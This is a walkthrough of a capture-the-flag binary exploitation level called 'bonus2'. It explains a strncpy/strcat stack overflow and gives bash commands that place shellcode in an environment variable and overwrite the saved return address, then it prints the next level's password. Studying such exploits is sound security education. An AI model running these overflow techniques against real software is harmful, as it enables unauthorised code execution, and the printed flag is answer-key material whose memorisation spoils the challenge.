# Bonus 2 Walkthrough

## Main Function
```asm
char dest[76];
memset(dest, 0, sizeof(dest));
strncpy(dest, argv[1], 40);
strncpy(dest+40, argv[2], 32);
memcpy(local_copy, dest, sizeof(dest));
greetuser(local_copy);
```

`greetuser` chooses a greeting string based on `LANG`:
- default: `"Hello "`
- `"fi"`: `"Hyvää päivää! "`
- `"nl"`: `"Goedemiddag! "`

It copies the greeting into a 72-byte stack buffer and then performs `strcat(buffer, user_input)`.

## Vulnerability
`strncpy` does not append `\0` when the input length equals the limit. If we supply:
- `argv[1]` with exactly 40 bytes,
- `argv[2]` with at least 32 bytes,

then `dest` becomes two back-to-back strings with no null terminator between them. When `strcat` runs inside `greetuser`, it keeps reading until it finds a `\0`, effectively appending 72+ bytes to a 72-byte array—stack overflow.

GDB cyclic analysis shows EIP control after 23 bytes beyond the end of the greeting. Setting `LANG=nl` (13-byte greeting) makes the offset stable.

## Exploit Plan
1. `export LANG=nl`.
2. Put shellcode in an environment variable and note its address.
3. Call the program with:
   - `argv[1] = "A"*40`
   - `argv[2] = padding + retaddr`, where `padding = "B"*19` (to reach saved EIP) and `retaddr` is the shellcode address.
4. `strcat` overflows the stack frame, overwriting the saved return pointer with our chosen address. When `greetuser` returns, execution jumps to the shellcode.

Example:
```bash
$ export SHELLCODE=$(python3 -c 'print("\\x90"*100 + "<shellcode>")')
$ ./bonus2 $(python3 -c 'print("A"*40)') $(python3 -c 'import struct; print("B"*19 + struct.pack("<I", 0xbffffabc).decode("latin1"))')
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## Notes
- The offset (19 bytes) may vary slightly; verify with `pattern create/search`.
- The same technique works with any greeting; `LANG=nl` simply provides the most consistent layout.
